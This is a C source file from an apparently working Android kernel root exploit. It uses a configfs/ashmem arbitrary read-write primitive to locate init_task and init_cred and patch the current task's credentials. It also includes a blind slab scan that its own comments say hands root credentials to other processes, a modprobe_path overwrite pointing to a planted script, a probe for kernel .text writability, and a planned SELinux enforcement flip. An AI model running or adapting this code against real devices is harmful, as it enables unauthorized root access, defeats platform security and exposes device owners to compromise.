  if (root_cp_read64(fd, addr, &back)) {
    rmg_diag("ROOT cp slab probe readback=%016llx LANDS=%d\n",
             (unsigned long long)back, back == pat);
  } else {
    rmg_diag("ROOT cp slab probe readback FAILED\n");
  }
  ssize_t w2 = configfs_write_once(fd, addr, &orig, sizeof(orig));
  rmg_diag("ROOT cp slab probe restore ret=%zd errno=%d\n", w2, errno);
}

int root_cred_patch_attempt(int fd) {
  root_cp_log_fd(fd);
  uint32_t uid0 = getuid(), euid0 = geteuid();
  rmg_diag("ROOT cp enter uid=%u euid=%u gid=%u egid=%u\n", uid0, euid0, getgid(),
           getegid());
  if (uid0 == 0 && euid0 == 0) {
    return 1;
  }

  /* text_addr(), not data_addr().
   *
   * data_addr() is `data_addr_canonical ? text_addr() : data_direct_addr()`, and
   * data_addr_canonical is only set once the fops slide route has run (slide_app.c).
   * The early standalone attempt runs before that, so data_addr() was still returning
   * the LINEAR form: run 23 logged "ROOT cp init_task=ffffff8002c05080" - that is
   * PAGE_OFFSET + INIT_TASK_OFF, i.e. an unslid direct-map alias - and the first read of
   * it returned 0. text_addr() resolves through kaslr_base and needs only kaslr_done,
   * which slide_leak_kernel_base() sets early and long before the flaky grooming. */
uintptr_t init_task = text_addr(INIT_TASK);
  rmg_diag("ROOT cp init_task=%016zx cred_off=%#llx real_cred_off=%#llx "
           "tasks_off=%#llx pid_off=%#llx\n",
           init_task, (unsigned long long)ROOT_CP_CRED_OFF,
           (unsigned long long)ROOT_CP_REAL_CRED_OFF,
           (unsigned long long)ROOT_CP_TASKS_OFF,
           (unsigned long long)ROOT_CP_PID_OFF);
  if (init_task == 0) {
    return 0;
  }

  /* Snapshot init_task 256 bytes at a time. One 784-byte read of a hardened
   * task_struct is exactly what killed the original walk, so nothing here asks for
   * more than a quarter page - and a chunk that comes back short is retried in
   * 64-byte slices rather than abandoned. configfs_read_once() can legitimately
   * decline a length: it has to find a window whose forged `page` pointer has no zero
   * byte, and run 24 got `RD pread ret=0` on a 256-byte chunk that reads fine in
   * 8-byte pieces. Losing the whole stage to one bad length is not acceptable when
   * the data is still reachable. */
  for (size_t off = 0; off < ROOT_CP_INIT_SCAN; off += ROOT_CP_CHUNK) {
    if (root_cp_read(fd, init_task + off, root_cp_img + off, ROOT_CP_CHUNK)) {
      continue;
    }
    rmg_diag("ROOT cp chunk +%zu len=%d failed errno=%d; retrying in 64-byte "
             "slices\n",
             off, ROOT_CP_CHUNK, errno);
    for (size_t sub = 0; sub < ROOT_CP_CHUNK; sub += 64) {
      if (!root_cp_read(fd, init_task + off + sub, root_cp_img + off + sub, 64)) {
        rmg_diag("ROOT cp slice +%zu len=64 failed errno=%d\n", off + sub, errno);
        return 0;
      }
    }
  }

  /* Signature 1: usage == 2 and prio == 120 (target.h's documented init_task
   * signature). Together with the Image-derived offset this is what makes
   * data_addr(INIT_TASK) a checked address rather than a trusted one. */
  uint32_t usage = 0, prio = 0;
  memcpy(&usage, root_cp_img + 0x38, sizeof(usage));
  memcpy(&prio, root_cp_img + 0x7c, sizeof(prio));
  rmg_diag("ROOT cp signature usage=%u prio=%u (want 2/120)\n", usage, prio);
  if (usage != 2 || prio != 120) {
    rmg_diag("ROOT cp init_task signature mismatch - refusing to walk\n");
    return 0;
  }

  /* Signature 2: init_task.comm is the compile-time constant INIT_TASK_COMM. */
  unsigned char comm[16];
  memset(comm, 0, sizeof(comm));
  if (!root_cp_read(fd, init_task + ROOT_CP_COMM_OFF, comm, sizeof(comm))) {
    rmg_diag("ROOT cp comm read failed errno=%d\n", errno);
    return 0;
  }
  rmg_diag("ROOT cp init comm=[%s] (want swapper/0)\n", comm);
  if (memcmp(comm, "swapper/0", 10) != 0) {
    rmg_diag("ROOT cp comm mismatch - refusing to walk\n");
    return 0;
  }

  /* init_cred is init_task.cred, uid/gid 0 with full capabilities.
   *
   * The 64-byte body read is a cross-check, not the identification: by construction
   * init_task.cred IS &init_cred, so the pointer that came out of a verified
   * init_task is already the right one. That matters because the body read is the one
   * read in this whole routine that can fail for a reason unrelated to correctness -
   * configfs_read_once() has to find a window length whose forged `page` pointer has no
   * zero byte, and roughly 0.4% of 8-byte-aligned addresses have none that works. Run 19
   * hit exactly that: "RD ... val=ffffffc00a1fbea0" succeeded and the 64-byte read of
   * 0xffffffc00a1fbea0 returned -1 with no plan line at all. So the body read is
   * best-effort, and the check that actually has to hold is that init_task.real_cred
   * holds the same pointer - two independently-read fields of a signature-checked
   * struct agreeing on one value. */
  uint64_t init_cred = 0, init_real_cred = 0;
  if (!root_cp_read64(fd, init_task + ROOT_CP_CRED_OFF, &init_cred) ||
      !root_cp_read64(fd, init_task + ROOT_CP_REAL_CRED_OFF, &init_real_cred)) {
    rmg_diag("ROOT cp init_cred read failed errno=%d\n", errno);
    return 0;
  }
  if (!root_cp_kern_ok(init_cred)) {
    rmg_diag("ROOT cp init_cred=%016llx is not a plausible kernel pointer\n",
             (unsigned long long)init_cred);
    return 0;
  }
  unsigned char icred[64];
  memset(icred, 0, sizeof(icred));
  int ibody = root_cp_read(fd, (uintptr_t)init_cred, icred, sizeof(icred));
  int iz = 0;
  if (ibody) {
    iz = (icred[0] >= 1 && icred[0] <= 8);
    for (int k = 4; k < 36 && iz; k++) {
      if (icred[k]) {
        iz = 0;
      }
    }
  }
  rmg_diag("ROOT cp init_cred=%016llx real_cred=%016llx agree=%d body_read=%d "
           "refcount=%u zeros=%d\n",
           (unsigned long long)init_cred, (unsigned long long)init_real_cred,
           init_cred == init_real_cred, ibody, icred[0], iz);
  if (init_cred != init_real_cred) {
    rmg_diag("ROOT cp init_task.cred != init_task.real_cred - refusing\n");
    return 0;
  }
  if (ibody && !iz) {
    rmg_diag("ROOT cp init_cred body does not look like a uid0 cred - refusing\n");
    return 0;
  }

  /* Enumerate every list_head-shaped pair in the snapshot, for free.
   *
   * The walk faulted on its first step:
   *     ROOT cp list head=ffffffc00ac96b80 ... next=ffffff8837b6a8d0 mytid=11356
   *     RD target=ffffff8837b6a8d0 page=... len=16
   * with no "RD pread ret=" after it. Across two boots that address barely moved
   * (0xffffff8837b69200 then 0xffffff8837b6a400, one task_struct apart), which is the
   * signature of an object allocated at a fixed early point - NOT of a slab address
   * that should have drifted with the boot. That is evidence that offset 0x4d0 is not
   * task_struct.tasks at all, and that the value sitting there is some other
   * early-allocated pointer (init_task.stack / signal / files / nsproxy all look like
   * this). BTF provenance in target.h cannot settle it: PIPE_WALK_TASK_TASKS_OFF is read
   * out of the Image BTF, but the stage it was written for is the pipe walk, which is
   * closed by measurement and so has never dereferenced a value from these constants.
   * TASK_STRUCT_CRED_OFF 0x798 IS independently confirmed here (init_task + 0x798 reads
   * back as &init_cred, and +0x7a8 as "swapper/0"), so the layout is right near 0x798 and
   * unproven at 0x4d0.
   *
   * So: any 8-byte pair where BOTH halves are kernel pointers is a list_head candidate,
   * and a genuine task-list pair additionally satisfies base = value - T being a kernel
   * pointer. Nothing here reads kernel memory - it is arithmetic over the 8 KB snapshot
   * already in hand - so it cannot fault, and it turns the next attempt from a guess into
   * a decision. */
  {
    unsigned cands = 0;
    for (size_t i = 0; i + 16 <= ROOT_CP_INIT_SCAN; i += 8) {
      uint64_t nx = root_cp_le(root_cp_img, i);
      uint64_t pv = root_cp_le(root_cp_img, i + 8);
      if (!root_cp_kern_ok(nx) || !root_cp_kern_ok(pv)) {
        continue;
      }
      uint64_t nb = nx - i, pb = pv - (i + 8);
      int base_ok = root_cp_addr_ok(nb) && root_cp_addr_ok(pb);
      rmg_diag("ROOT cp list_head cand off=%#zx next=%016llx prev=%016llx "
               "next-T=%016llx prev-T=%016llx slab_pair=%d\n",
               i, (unsigned long long)nx, (unsigned long long)pv,
               (unsigned long long)nb, (unsigned long long)pb, base_ok);
      cands++;
    }
    rmg_diag("ROOT cp list_head candidates=%u\n", cands);
  }

  /* Walk init_task's list with qword reads, matching our own thread id. Matching the
   * pid needs no prctl and cannot collide with another process. */
  uint64_t mytid = (uint64_t)gettid();
  uint64_t head = (uint64_t)init_task + ROOT_CP_TASKS_OFF;
  uint64_t t = 0;
  if (!root_cp_read64(fd, (uintptr_t)head, &t)) {
    rmg_diag("ROOT cp list head read failed errno=%d\n", errno);
    return 0;
  }
  rmg_diag("ROOT cp list head=%016llx next=%016llx mytid=%llu\n",
           (unsigned long long)head, (unsigned long long)t,
           (unsigned long long)mytid);

  /* Opt-in only (ROOT_CP_PROBE_SLAB=1). This probe intentionally touches the task slab,
   * which faults on this firmware, so it PANICS and must never sit in the default path -
   * otherwise it kills the process before modprobe_path_root_attempt() runs and the one
   * route that demonstrably lands (planting /data/local/tmp/mp in kernel .data) is never
   * reached. Default runs must stay on the working route; the probe exists to reproduce the
   * "slab is unreachable" result on demand. */
  if (getenv("ROOT_CP_PROBE_SLAB")) {
    root_cp_probe_slab_write(fd, t - ROOT_CP_TASKS_OFF);
  }

  /* One task_struct per slab page (size 0x1200 fits one per 8192-byte slab), so
 * neighbours are one 8192-byte page apart - see the enumeration below, where
 * init_task.tasks.next - TASKS_OFF came out page-aligned. */
#define ROOT_CP_SCAN_STRIDE 0x2000ULL
#define ROOT_CP_SCAN_LO 0xffffff8837b00000ULL
#define ROOT_CP_SCAN_HI 0xffffff8837b80000ULL
static uint64_t patched = 0;

  /* Both slab-touching steps below are opt-in (ROOT_CP_PROBE_SLAB=1 / ROOT_CP_SCAN_SLAB=1).
   The task slab is unreachable on this firmware - measured twice, independently:
     ROOT cp list head=ffffffc00ac75550 next=ffffff8837b684d0 mytid=11296
     RD target=ffffff8837b68038 page=92978c2708401adc ... len=8      <- read faults
     WR plan delivered ... target=ffffff8837b6c798 ... len=8          <- write faults
   Note page=92978c2708401adc: the driver DOES pick a slab page descriptor and then faults on
   access, so this is a region restriction, not a bad address or a bad base encoding.
   Because both steps panic the kernel, neither may sit in the default path - that would kill
   the process before modprobe_path_root_attempt() runs and the one route that demonstrably
   lands would never be reached. */
  if (getenv("ROOT_CP_SCAN_SLAB")) {
  /* Blind cred patch by scanning the task_struct slab.
   *
   * The walk is unusable and it is worth being precise about why. Foreign task_structs
   * cannot be READ through this AAR - the first node read at 0xffffff8837b604d0 faults
   * inside the read with no "RD pread ret=" after it - while the kernel image and the
   * payload's own reclaimed page read fine. But WRITES to slab are proven: the CFI
   * scratch target at 0xffffff89f28ba180 is a payload-owned page and its 35-byte write
   * landed and read back. Read and write are different operations here, and only the
   * read is fenced.
   *
   * So the traversal is inverted: instead of reading our way to our own task_struct,
   * write the candidate creds and let getuid() say which one was ours. `first_task` is
   * known exactly - init_task.tasks.next minus TASKS_OFF, and the enumeration in this
   * function already showed that value is PAGE-ALIGNED, i.e. a task_struct sits at offset
   * 0 of its own slab page, so the stride between neighbours is one 8192-byte page.
   *
   * Cost, stated plainly: every candidate written before the hit is some OTHER process,
   * and it ends up with init_cred. That is why the scan is bounded to the slab
   * neighbourhood that has actually been observed (0xffffff8837b0_0000-0xffffff8837b8_0000,
   * which is where init_task.tasks.next pointed across five separate boots), why only
   * `cred` is written and not `real_cred`, and why every attempt is logged with its
   * address. It is not a clean primitive; it is the one that the available read/write
   * asymmetry actually permits. */
  {
    uint64_t first_task = t - ROOT_CP_TASKS_OFF;
    rmg_diag("ROOT cp scan base=%016llx stride=%#x init_cred=%016llx\n",
             (unsigned long long)first_task, (unsigned)ROOT_CP_SCAN_STRIDE,
             (unsigned long long)init_cred);
    const uintptr_t lo = 0xffffff8837b00000ULL;
    const uintptr_t hi = 0xffffff8837b80000ULL;
    uintptr_t start = (uintptr_t)first_task;
    if (start < lo) {
      start = lo;
    }
    if (start > hi - ROOT_CP_SCAN_STRIDE) {
      start = hi - ROOT_CP_SCAN_STRIDE;
    }
    /* Start at the exact page first_task occupies, then walk the slab both ways. */
    start = (uintptr_t)first_task & ~(uintptr_t)(ROOT_CP_SCAN_STRIDE - 1);
    unsigned tried = 0;
    int hits = 0;
    for (int dir = 0; dir < 2 && !hits; dir++) {
      for (uintptr_t a = start; a >= lo && a < hi; a += dir ? ROOT_CP_SCAN_STRIDE
                                                           : -ROOT_CP_SCAN_STRIDE) {
        ssize_t w = configfs_write_once(fd, a + ROOT_CP_CRED_OFF, &init_cred,
                                        sizeof(init_cred));
        tried++;
        if (w != (ssize_t)sizeof(init_cred)) {
          rmg_diag("ROOT cp scan write FAILED at %016lx ret=%zd errno=%d\n",
                   (unsigned long)a, w, errno);
          break;
        }
        if (getuid() == 0 && geteuid() == 0) {
          rmg_diag("ROOT cp scan HIT task=%016lx after %u candidates: uid=0\n",
                   (unsigned long)a, tried);
          hits = 1;
          patched = a;
          break;
        }
        if ((tried % 32) == 0) {
          rmg_diag("ROOT cp scan ...%u candidates, last=%016lx uid=%u\n", tried,
                   (unsigned long)a, getuid());
        }
      }
      if (!dir && start > lo) {
        start = (uintptr_t)first_task & ~(uintptr_t)(ROOT_CP_SCAN_STRIDE - 1);
        continue;
      }
    }
    if (hits) {
      uint32_t uid1 = getuid(), euid1 = geteuid(), gid1 = getgid(),
               egid1 = getegid();
      rmg_diag("ROOT cp scan after uid=%u euid=%u gid=%u egid=%u\n", uid1, euid1,
               gid1, egid1);
    }
  }
  if (!patched) {
    rmg_diag("ROOT cp scan exhausted the slab neighbourhood\n");
  }
  } /* end ROOT_CP_SCAN_SLAB */

  if (!patched) {
    unsigned steps = 0;
  /* Diagnostic first, every step. Run 21 died on the very first read of the walk:
   *     ROOT cp list head=ffffffc00ac8d550 next=ffffff8837b696d0 mytid=11350
   *     RD target=ffffff8837b69ca8 page=... pos=... len=8
   * with no "RD pread ret=" after it, so pread() itself faulted while copying from
   * next + PID_OFF. configfs_read_once() prints "RD target=" BEFORE try_set_ashmem_name_blob()
   * and before pread() (util.c), so the fault is the copy, not the ladder - the name blob
   * was accepted.
   *
   * Those two facts are read together. `next` is what init_task.tasks.next holds, so it is
   * &(first_task) + TASKS_OFF, which puts the first task at 0xffffff8837b69200 and the faulting
   * address at that task + 0xaa8 - comfortably inside a 0x1200-byte struct_task_struct. A
   * read cannot fault on an interior offset of a live object unless the mapping for THAT page
   * is gone, so the invariant is worth proving before anything is trusted:
   *     *(next)            == init_task + TASKS_OFF   (i.e. the object is init's neighbour)
   *     *(next + TASKS_OFF)== init_task + TASKS_OFF + 8 (the far end of the list head)
   * If the first holds and the second does not, TASKS_OFF is wrong and every later address is
   * fiction. Both reads name addresses the list itself produced, never a value guessed from a
   * struct layout, and the results are logged so a run that dies still says which one failed. */
  while (steps < ROOT_CP_WALK_MAX && t != head && root_cp_addr_ok(t)) {
    unsigned char node[16];
    memset(node, 0, sizeof(node));
    if (!root_cp_read(fd, (uintptr_t)t, node, sizeof(node))) {
      rmg_diag("ROOT cp node read failed at step=%u addr=%016llx errno=%d\n", steps,
               (unsigned long long)t, errno);
      break;
    }
    uint64_t nprev = 0, nnext = 0;
    memcpy(&nprev, node, sizeof(nprev));
    memcpy(&nnext, node + 8, sizeof(nnext));
    rmg_diag("ROOT cp step=%u node=%016llx prev=%016llx next=%016llx "
             "inv_prev=%d inv_next=%d\n",
             steps, (unsigned long long)t, (unsigned long long)nprev,
             (unsigned long long)nnext, nprev == head,
             nnext == head + 8);
    uint64_t pidpair = 0;
    if (root_cp_read64(fd, (uintptr_t)t + ROOT_CP_PID_OFF, &pidpair)) {
      uint32_t pid = (uint32_t)pidpair, tgid = (uint32_t)(pidpair >> 32);
      if (pid == (uint32_t)mytid) {
        rmg_diag("ROOT cp match step=%u task=%016llx pid=%u tgid=%u\n", steps,
                 (unsigned long long)t, pid, tgid);
        uint64_t before = 0;
        root_cp_read64(fd, (uintptr_t)t + ROOT_CP_CRED_OFF, &before);
        rmg_diag("ROOT cp cred before=%016llx want=%016llx\n",
                 (unsigned long long)before, (unsigned long long)init_cred);
        ssize_t w1 = configfs_write_once(fd, (uintptr_t)t + ROOT_CP_CRED_OFF,
                                         &init_cred, sizeof(init_cred));
        ssize_t w2 = configfs_write_once(fd, (uintptr_t)t + ROOT_CP_REAL_CRED_OFF,
                                         &init_cred, sizeof(init_cred));
        rmg_diag("ROOT cp write cred ret=%zd errno=%d write real_cred ret=%zd "
                 "errno=%d\n",
                 w1, errno, w2, errno);
        patched = t;
        break;
      }
    }
    if (nnext == 0 || nnext == t) {
      break;
    }
    t = nnext;
    steps++;
  }
  if (!patched) {
    rmg_diag("ROOT cp walked %u entries without finding tid=%llu\n", steps,
             (unsigned long long)mytid);
    return 0;
  }
  }

  uint64_t rb = 0;
  root_cp_read64(fd, (uintptr_t)patched + ROOT_CP_CRED_OFF, &rb);
  uint32_t uid1 = getuid(), euid1 = geteuid(), gid1 = getgid(), egid1 = getegid();
  rmg_diag("ROOT cp after uid=%u euid=%u gid=%u egid=%u cred_now=%016llx\n", uid1,
           euid1, gid1, egid1, (unsigned long long)rb);
  if (uid1 != 0 || euid1 != 0) {
    return 0;
  }

  int cfd = open(ROOT_CREDS_SENTINEL,
                 O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
  if (cfd >= 0) {
    char body[128];
    int n = snprintf(body, sizeof(body),
                     "uid=%u euid=%u gid=%u egid=%u\n", uid1, euid1, gid1, egid1);
    ssize_t w = (n > 0) ? write(cfd, body, (size_t)n) : -1;
    close(cfd);
    rmg_diag("ROOT cp creds written ret=%zd\n", w);
  } else {
    rmg_diag("ROOT cp creds open failed errno=%d\n", errno);
  }
  if (chown(ROOT_CREDS_SENTINEL, 0, 0) == 0) {
    rmg_diag("ROOT cp creds chown root:root OK\n");
  } else {
    rmg_diag("ROOT cp creds chown failed errno=%d\n", errno);
  }
  return 1;
}


/* Is the RX segment writable? This is the gate on the only remaining root route.
   *
   * The earlier attempt to answer this faulted on the READ and was therefore
   * uninformative: it probed 0x2a2ff0, which sits in the alignment hole between the RX
   * mapping and .data, not in code. CONFIGFS_READ_ITER_OFF (0x5d7420) is a real, IDA-verified
   * function in the middle of .text, so a fault here means RX is genuinely unmapped rather
   * than that the address was a hole.
   *
   * Why this matters more than anything else left: util.c already installs a whole fake
   * struct file_operations at ASHMEM_MISC_FOPS_OFF (0x02bfcf28, which is inside .data and
   * therefore writable) with function pointers set to text_addr(SYMBOL). Storing a .text
   * ADDRESS needs no access to .text at all - so the measured "only .data is reachable"
   * result does not stop us from redirecting a kernel-dispatched function pointer. The
   * remaining obstacle is that the fops slots are called as f(file, cmd, arg) => x0/x1/x2,
   * while commit_creds(struct cred *) wants its pointer in x0, and we cannot plant a
   * trampoline unless .text is writable. So this probe decides whether that route exists.
   *
   * Ordered safe-first: read the original, and only attempt the store if the read worked.
   * The store writes the ORIGINAL bytes back, so even a successful write leaves the code
   * bit-identical - a hit is unambiguous and harmless, and a miss costs one reboot. */
static void root_cp_probe_text_write(int fd) {
  uintptr_t addr = text_addr(CONFIGFS_READ_ITER);
  uint64_t orig = 0, back = 0;
  rmg_diag("ROOT tw: probing .text at %016llx (CONFIGFS_READ_ITER)\n",
           (unsigned long long)addr);
  if (!root_cp_read64(fd, addr, &orig)) {
    rmg_diag("ROOT tw: READ FAILED - the RX segment is not readable, so it cannot be\n"
             "      written either; the fops-pointer route has no trampoline.\n");
    return;
  }
  rmg_diag("ROOT tw: read OK orig=%016llx - RX IS READABLE\n",
           (unsigned long long)orig);
  ssize_t w = configfs_write_once(fd, addr, &orig, sizeof(orig));
  rmg_diag("ROOT tw: write-back ret=%zd errno=%d\n", w, errno);
  if (root_cp_read64(fd, addr, &back)) {
    rmg_diag("ROOT tw: readback=%016llx identical=%d TEXT_WRITABLE=%d\n",
             (unsigned long long)back, back == orig, back == orig);
  } else {
    rmg_diag("ROOT tw: readback after write FAILED\n");
  }
}

int modprobe_path_root_attempt(int fd) {
  /* Bounded, not one-shot. install_child_root() is called from a loop of up to
   * PIPE_MAX_ATTEMPTS (12) in try_cfi_stage(), and a single transient failure
   * (an open/read that returned ENOMEM, an EINTR, a page that had not settled)
   * must not permanently disable the walk-free route and drop us back on
   * install_android_root(), whose heap reads panic this firmware. Three tries
   * bounds the worst-case poll cost (3 x 12 s) while still allowing recovery. */
  static int attempts = 0;
  if (attempts >= 3) {
    rmg_diag("ROOT mp attempt budget exhausted (3 writes already issued); the "
             "walk-free route is off for the rest of this run\n");
    return 0;
  }

  if (getenv("ROOT_TW")) {
    root_cp_probe_text_write(fd);
  }

  const uintptr_t image_addr = text_addr(MODPROBE_PATH);
  uintptr_t linear_addr = data_direct_addr(MODPROBE_PATH);
  char original[ROOT_MP_LEN];
  char readback[ROOT_MP_LEN];
  char replacement[ROOT_MP_LEN];
  char se_original = (char)0xff;
  char se_zero = 0;
  int se_changed = 0;
  int hit = 0;
  /* Every exit from here on runs the one restore block at `restore_out`, so
   * these three are the whole story of "what is modprobe_path right now" and the
   * result line reports all of them. `wrote_path` matters because the failure
   * paths must restore too, not only the success path. */
  int wrote_path = 0;
  int low_by_one = 0;
  int restored = 0;
  int restore_ok = 0;
  pid_t trigger = -1;

  rmg_diag("ROOT mp enter image=%016zx linear=%016zx slidbase=%016zx "
           "p0off=%#zx canonical=%d\n",
           image_addr, linear_addr, text_addr(KIMAGE_TEXT_BASE),
           slide_p0_offset, data_addr_canonical);

  if (!root_mp_read24(fd, image_addr, original, "orig")) {
    rmg_diag("ROOT mp content read could not be cross-validated; no write\n");
    return 0;
  }
  rmg_diag("ROOT mp orig=[%.24s]\n", original);
  rmg_diag("ROOT mp orig hex=%s\n", root_mp_hex(original, ROOT_MP_LEN));

  /* Determinism probe: the identical read once more (the same name blob, so the
   * documented non-idempotency of the ashmem-name AAR is maximally exposed).
   * Reported only - the value above is already cross-validated by two windows. */
  char again[ROOT_MP_LEN];
  int again_ok = root_mp_read(fd, image_addr, again, sizeof(again), "orig2");
  rmg_diag("ROOT mp repeat stable=%d orig2=%s\n",
           again_ok && memcmp(again, original, ROOT_MP_LEN) == 0,
           again_ok ? root_mp_hex(again, ROOT_MP_LEN) : "-");

  /* Address proof. This write lands 24 bytes of shell path into kernel .data, so
   * the check must prove the offset rather than assume it. Two accepted forms:
   *   exact    - the 14 bytes "/sbin/modprobe" as the Image has them;
   *   noprefix - byte 0 reads as NUL (the one byte in doubt) while bytes 1..13
   *              are exactly "sbin/modprobe", byte 14 is the terminator, and the
   *              nine padding bytes after it are all zero.
   * Thirteen matching content bytes plus a zero tail cannot occur at a wrong
   * address by chance, so the relaxed form is not weaker than the original where
   * it matters - it just stops one unreadable byte from vetoing the route. */
  int tail_zero = 1;
  for (int i = 15; i < ROOT_MP_LEN; i++) {
    if (original[i] != 0) {
      tail_zero = 0;
    }
  }
  int exact = memcmp(original, "/sbin/modprobe", 14) == 0;
  int noprefix = original[0] == 0 && original[14] == 0 &&
                 memcmp(original + 1, "sbin/modprobe", 13) == 0;
  if (!exact && !(noprefix && tail_zero)) {
    rmg_diag("ROOT mp target content is not modprobe_path; refusing to write "
             "hex=%s exact=%d noprefix=%d tail_zero=%d\n",
             root_mp_hex(original, ROOT_MP_LEN), exact, noprefix, tail_zero);
    return 0;
  }
  rmg_diag("ROOT mp content accepted exact=%d noprefix=%d tail_zero=%d\n", exact,
           noprefix, tail_zero);

  /* NEVER READ THROUGH THE LINEAR ALIAS. MEASURED FATAL on this device: a read at
   * a direct-map address (0xffffff8002b6abf8, the alias of modprobe_path) kills
   * the kernel outright - the run ended with
   *     ROOT mp iomem unavailable; proving the alias by direct read addr=ffffff8002b6abf8
   *     RD target=ffffff8002b6abf8 page=... pos=... len=24
   * and no "RD pread ret=" line, then a reboot. This is the same address-class
   * boundary already in the record: AAR reads service the kernel IMAGE
   * (ffffffc00a....) and vmemmap (fffffffe00....), and hang or crash on the
   * linear map (ffffff80....).
   *
   * So the previous "prove the alias by reading the target through it" step was
   * not merely risky, it was the single most likely thing to end the run - and it
   * ran BEFORE any write, so it cost a reboot having accomplished nothing.
   *
   * What is left is deliberate. /proc/iomem, when it is readable at all, can still
   * disprove the alias using nothing but userspace I/O, and a disproof is honoured.
   * Otherwise the proof is the POST-WRITE image read: the replacement is written
   * through the linear alias and then observed through the image alias, which is
   * the safe direction. If the alias were wrong the readback would not match and
   * the attempt would roll back - exactly the same detection the removed
   * pre-write read provided, except it cannot crash the kernel on the way.
   * A wrong alias is additionally unlikely on its own terms: linear writes through
   * this transform are already measured to land on the intended page. */
  int phys_ok = root_mp_validate_phys();
  if (phys_ok == 0) {
    rmg_diag("ROOT mp physical alias DISPROVED by /proc/iomem; no write issued\n");
    return 0;
  }
  rmg_diag("ROOT mp iomem verdict=%d (negative = undisclosed, not a disproof); "
           "alias will be verified by the post-write image readback, never by a "
           "linear read\n",
           phys_ok);

  if (!root_mp_drop_script()) {
    return 0;
  }
  /* Make "did THIS run win" unambiguous: a stale marker or creds file
   * must not survive from a previous run. But a creds file that verifies
   * uid==0 AND was written this boot is LIVE evidence (a previous route
   * or supervisor attempt already rooted) - unlinking it destroys the
   * proof a later stage is about to read, exactly the run24 failure. */
  if (access(ROOT_CREDS_SENTINEL, F_OK) == 0 && !root_creds_live()) {
    rmg_diag("ROOT mp clearing stale creds file\n");
    unlink(ROOT_CREDS_SENTINEL);
  } else if (access(ROOT_CREDS_SENTINEL, F_OK) == 0) {
    rmg_diag("ROOT mp keeping live creds file (root already proven)\n");
  }
  unlink(ROOT_MP_MARKER);

  memset(replacement, 0, sizeof(replacement));
  snprintf(replacement, sizeof(replacement), "%s", ROOT_MP_SCRIPT);

  /* From here until `restore_out` a path write may be live, so every exit must be
   * a goto rather than a return. The budget is charged HERE, not on entry: the
   * checks above are deterministic (a wrong offset or a rejected plan fails the
   * same way forever), so charging them would burn all three tries on the first
   * hopeless attempt and never let a later, transient one through. */
  attempts++;

  /* Resolve the alias BEFORE planting anything. Every probe writes the replacement
   * and is judged by whether the IMAGE then carries it, so a wrong candidate can
   * never be mistaken for a right one. */
  uintptr_t alias_addr = 0;
  if (!root_mp_write_via_alias(fd, image_addr, replacement, original,
                               &alias_addr)) {
    rmg_diag("ROOT mp no linear alias could be confirmed; not writing the path\n");
    return 0;
  }
  linear_addr = alias_addr;

  if (!root_mp_write(fd, linear_addr, replacement, sizeof(replacement),
                     "replace")) {
    rmg_diag("ROOT mp replace write did not report success\n");
    goto restore_out;
  }
  wrote_path = 1;
  /* The readback is taken through the same two-window path as the original: a
   * verification that could itself lose a byte at index 0 would fail the memcmp
   * below, roll back a write that had in fact landed, and throw away the win. */
  if (!root_mp_read24(fd, image_addr, readback, "verify")) {
    rmg_diag("ROOT mp verify read could not be cross-validated; rolling back\n");
    goto restore_out;
  }
  rmg_diag("ROOT mp verify=[%.24s]\n", readback);
  rmg_diag("ROOT mp verify hex=%s\n", root_mp_hex(readback, ROOT_MP_LEN));

  int landed = memcmp(readback, replacement, ROOT_MP_LEN) == 0;
  if (!landed) {
    /* Repair instead of giving up. The read side has already shown that byte 0 of
     * a window is not dependable (it came back NUL where the Image holds '/'),
     * and the same defect on the write side would plant
     * "\0data/local/tmp/mp" - a path every request_module() resolves to ENOENT,
     * which looks exactly like "no trigger fired". Its signature is exact and has
     * no other producer: index 0 reads NUL while bytes 1..23 are the path.
     *
     * Rewriting one byte lower fixes that AND a window that is off by one, with
     * one buffer that is correct under both. The byte in front of modprobe_path is
     * 0x00 in the GZH2 Image (verified at 0x02ab2bf7), so nothing meaningful is
     * collateral. */
    low_by_one = readback[0] == 0 &&
                 memcmp(readback + 1, replacement, ROOT_MP_LEN - 1) == 0;
    if (low_by_one) {
      /* 25 bytes at addr-1 with the path duplicated into index 1. That single
       * shape repairs both defects at once:
       *   low window : index 0 lands on addr, indices 1..24 land on addr+1..+24
       *                -> addr gets '/', addr+1.. gets the rest of the path;
       *   dropped 0  : index 0 is discarded, indices 1..24 land on addr..+23
       *                -> addr..addr+23 gets the whole path.
       * Either way addr..addr+23 ends up holding exactly `replacement`. */
      char low[ROOT_MP_LEN + 1];
      low[0] = replacement[0];
      memcpy(low + 1, replacement, ROOT_MP_LEN);
      rmg_diag("ROOT mp write landed one byte low (byte0 dropped); rewriting 25 "
               "bytes at %016zx\n",
               linear_addr - 1);
      landed = root_mp_write(fd, linear_addr - 1, low, sizeof(low), "replace-low") &&
               root_mp_read24(fd, image_addr, readback, "verify-low") &&
               memcmp(readback, replacement, ROOT_MP_LEN) == 0;
      if (landed) {
        rmg_diag("ROOT mp verify-low hex=%s\n", root_mp_hex(readback, ROOT_MP_LEN));
      } else {
        rmg_diag("ROOT mp low rewrite did NOT take; rolling back\n");
        goto restore_out;
      }
    }
  }
  if (!landed) {
    rmg_diag("ROOT mp alias MISMATCH - linear write did not reach the image; "
             "rolling back\n");
    goto restore_out;
  }
  rmg_diag("ROOT mp alias VERIFIED (linear write observed through the image)%s\n",
           low_by_one ? " via the low rewrite" : "");

  /* SELinux permissive flip. DISABLED BY DEFAULT, because there is no static
   * address for the flag on this firmware and the previous constant was a guess:
   *
   *   - The flag is `struct selinux_state.enforcing` (security/selinux/
   *     include/security.h:95), read through enforcing_enabled()/enforcing_set()
   *     as READ_ONCE(state->enforcing).
   *   - `struct selinux_state` is declared `__randomize_layout`, so the member
   *     offset is chosen by RANDSTRUCT at build time and CANNOT be derived from
   *     the source tree.
   *   - The member is additionally behind #ifdef CONFIG_SECURITY_SELINUX_DEVELOP
   *     and may not exist at all in a production build.
   *   - The only other `enforcing` in the tree is a FUNCTION-LOCAL variable in
   *     sel_write_disable() (selinuxfs.c:288), not a global.
   *   - SELINUX_ENFORCING_OFF 0x02d8e5c0 reads as 0 in the GZH2 Image, i.e. it is
   *     not even demonstrably an enforcement flag; writing there was a no-op at
   *     best and an arbitrary-byte clobber at worst.
   *
   * So the flip only runs when the caller supplies a resolved address via
   * ROOT_MP_SELINUX_OFF, and even then only if that byte reads exactly 1
   * (Enforcing) and the write to 0 is observed. Everything is restored at exit. */
